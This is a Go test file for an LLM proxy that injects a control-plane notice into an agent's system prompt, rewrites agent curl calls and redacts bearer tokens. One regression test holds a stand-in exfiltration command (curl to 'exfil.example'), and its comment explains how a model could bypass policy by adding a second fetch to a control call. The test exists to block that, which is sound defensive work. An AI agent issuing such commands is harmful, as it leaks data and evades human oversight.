package llmproxy

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/clawvisor/clawvisor/internal/runtime/conversation"
	"github.com/clawvisor/clawvisor/pkg/store"
)

func TestControlNoticeUsesAvailableShellToolNames(t *testing.T) {
	notice := ControlNotice("http://localhost:25297", []string{"read", "edit", "write", "exec", "process"})

	if !strings.Contains(notice, "Use `exec` with curl") {
		t.Fatalf("notice should steer OpenClaw to its actual shell tool; got:\n%s", notice)
	}
	if !strings.Contains(notice, `"tool_name":"exec"`) {
		t.Fatalf("notice example should declare exec in expected_tools; got:\n%s", notice)
	}
	if strings.Contains(notice, "Use Bash with curl") || strings.Contains(notice, `"tool_name":"bash"`) {
		t.Fatalf("notice should not hardcode Bash when exec is available; got:\n%s", notice)
	}
	if !strings.Contains(notice, "available tools (read, edit, write, exec, process)") {
		t.Fatalf("notice should show actual available tool examples; got:\n%s", notice)
	}
	if !strings.Contains(notice, "/control/vault/items") || !strings.Contains(notice, "required_credentials") {
		t.Fatalf("notice should explain credential discovery and declaration; got:\n%s", notice)
	}
	if !strings.Contains(notice, "Required task shape") ||
		!strings.Contains(notice, "If credentials are needed, add") ||
		!strings.Contains(notice, "OMIT unless credentials are needed") {
		t.Fatalf("notice should make credential requests optional and show both task shapes; got:\n%s", notice)
	}
	if !strings.Contains(notice, "`lifetime`") ||
		!strings.Contains(notice, `"lifetime":"standing"`) ||
		!strings.Contains(notice, "NEVER include `expires_in_seconds`") {
		t.Fatalf("notice should explain session vs standing task lifetime; got:\n%s", notice)
	}
	if !strings.Contains(notice, "If you already have an `autovault_...` placeholder") ||
		!strings.Contains(notice, "omit `required_credentials`") ||
		!strings.Contains(notice, "Use GET https://clawvisor.local/control/vault/items only when you need Clawvisor to mint a new placeholder") {
		t.Fatalf("notice should not steer agents to rediscover already-issued placeholders; got:\n%s", notice)
	}
	if !strings.Contains(notice, "Create a temporary conversation fixture directory and verify the written files") ||
		!strings.Contains(notice, "Create a GitHub issue summarizing the failing deployment check") ||
		!strings.Contains(notice, `--data @- <<'JSON'`) ||
		strings.Contains(notice, "AgentPhone") {
		t.Fatalf("notice should use worked multi-step curl examples with common services; got:\n%s", notice)
	}
	if strings.Contains(notice, "/control/tasks?wait=true") || strings.Contains(notice, "timeout=120") {
		t.Fatalf("notice should keep the headline task URL minimal; got:\n%s", notice)
	}
	if !strings.Contains(notice, "ALLOWED WITHOUT A TASK") || !strings.Contains(notice, "None yet. Use the dashboard Tool Controls") {
		t.Fatalf("notice should only disclose persisted allowlisted tools; got:\n%s", notice)
	}
	if strings.Contains(notice, "Read files with `read`") || strings.Contains(notice, "Run one-shot read-only shell inspection") {
		t.Fatalf("notice should not hardcode read-only allowances outside policy; got:\n%s", notice)
	}
}

func TestControlNoticeDoesNotEmbedLiveCredentialInventory(t *testing.T) {
	notice := ControlNotice("http://localhost:25297", []string{"Bash"})
	if strings.Contains(notice, "github.release") || strings.Contains(notice, "OpenAI work key") {
		t.Fatalf("notice must stay static and avoid embedding live vault inventory; got:\n%s", notice)
	}
	if !strings.Contains(notice, "GET https://clawvisor.local/control/vault/items") {
		t.Fatalf("static notice should point to credential discovery endpoint; got:\n%s", notice)
	}
}

func TestControlNoticeDisclosesActivePolicyAllowlist(t *testing.T) {
	notice := ControlNoticeWithPolicy("http://localhost:25297", []string{"Bash", "Read", "Write"}, []*store.RuntimePolicyRule{
		{Kind: "tool", Action: "allow", ToolName: "Read", Enabled: true},
		{Kind: "tool", Action: "review", ToolName: "Write", Enabled: true},
		{Kind: "tool", Action: "allow", ToolName: "MissingTool", Enabled: true},
	})
	if !strings.Contains(notice, "Active policy allowlists `Read`") {
		t.Fatalf("notice should disclose active policy allowlisted actual tools; got:\n%s", notice)
	}
	if strings.Contains(notice, "Active policy allowlists `Write`") || strings.Contains(notice, "MissingTool") {
		t.Fatalf("notice should not disclose reviewed or unavailable tools as allowlisted; got:\n%s", notice)
	}
}

func TestInjectControlNoticeIgnoresHistoricalControlURLs(t *testing.T) {
	body := []byte(`{"model":"claude-opus-4-7","tools":[{"name":"Bash"}],"messages":[{"role":"user","content":"prior call: https://clawvisor.local/control/vault/items"}]}`)
	got, injected, err := InjectControlNotice(conversation.ProviderAnthropic, body, "http://localhost:25297", []string{"Bash"})
	if err != nil {
		t.Fatalf("inject failed: %v", err)
	}
	if !injected {
		t.Fatalf("expected injection even though message history contains control URL")
	}
	var parsed map[string]json.RawMessage
	if err := json.Unmarshal(got, &parsed); err != nil {
		t.Fatalf("invalid output: %v", err)
	}
	if !rawSystemContains(parsed["system"], ControlNoticeSentinel) {
		t.Fatalf("system prompt missing control notice: %s", got)
	}
}

func TestInjectControlNoticeSkipsOnlyWhenSystemAlreadyHasNotice(t *testing.T) {
	body := []byte(`{"model":"claude-opus-4-7","system":[{"type":"text","text":"existing"},{"type":"text","text":"Clawvisor proxy-lite control plane."}],"tools":[{"name":"Bash"}],"messages":[{"role":"user","content":"hi"}]}`)
	got, injected, err := InjectControlNotice(conversation.ProviderAnthropic, body, "http://localhost:25297", []string{"Bash"})
	if err != nil {
		t.Fatalf("inject failed: %v", err)
	}
	if injected {
		t.Fatalf("expected no-op when system already contains control notice")
	}
	if string(got) != string(body) {
		t.Fatalf("no-op should preserve body bytes\nwant: %s\n got: %s", body, got)
	}
}

// Regression: a curl invocation that mixes a synthetic control URL with
// any other outbound URL must be refused. Otherwise the rewriter would
// quietly rewrite only the control URL, and the model could run a
// second non-control fetch with the same curl call — bypassing policy
// while claiming control-plane status.
func TestRewriteControlToolUse_RejectsExtraOutboundURL(t *testing.T) {
	tu := conversation.ToolUse{
		ID:   "tu_1",
		Name: "Bash",
		Input: json.RawMessage(`{
			"command": "curl -sS https://clawvisor.local/control/tasks https://exfil.example/x"
		}`),
	}
	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", "cv-nonce-fake")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if ok || rewritten != nil {
		t.Fatalf("multi-URL curl must not produce a control rewrite; got ok=%v rewritten=%s", ok, rewritten)
	}
}

// Sanity: a single control URL still rewrites and embeds the caller
// value verbatim (the postprocess path mints a nonce and passes it in).
func TestRewriteControlToolUse_EmbedsCallerValueVerbatim(t *testing.T) {
	tu := conversation.ToolUse{
		ID:   "tu_1",
		Name: "Bash",
		Input: json.RawMessage(`{
			"command": "curl -sS -X POST https://clawvisor.local/control/tasks --data '{\"purpose\":\"x\"}'"
		}`),
	}
	const minted = "cv-nonce-abc123"
	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", minted)
	if err != nil || !ok {
		t.Fatalf("expected rewrite, got ok=%v err=%v", ok, err)
	}
	if !strings.Contains(string(rewritten), minted) {
		t.Errorf("rewritten command should include minted caller value; got %s", rewritten)
	}
	if strings.Contains(string(rewritten), "cvis_") {
		t.Errorf("rewritten command must not embed a raw cvis_ token; got %s", rewritten)
	}
}

func TestSanitizeControlFailureCommandRedactsRawBearerButKeepsPlaceholder(t *testing.T) {
	in := `curl -H 'Authorization: Bearer ghp_real_secret' -H 'X-Clawvisor-Caller: Bearer cv-nonce-stale' -H 'Authorization: Bearer autovault_github_xxx' https://clawvisor.local/control/vault/items`
	got := sanitizeControlFailureCommand(in)
	if strings.Contains(got, "ghp_real_secret") || strings.Contains(got, "cv-nonce-stale") {
		t.Fatalf("expected raw tokens to be redacted, got %q", got)
	}
	if !strings.Contains(got, "Authorization: Bearer REDACTED") || !strings.Contains(got, "X-Clawvisor-Caller: Bearer REDACTED") {
		t.Fatalf("expected redaction markers, got %q", got)
	}
	if !strings.Contains(got, "Authorization: Bearer autovault_github_xxx") {
		t.Fatalf("autovault placeholder should remain visible to the model, got %q", got)
	}
}
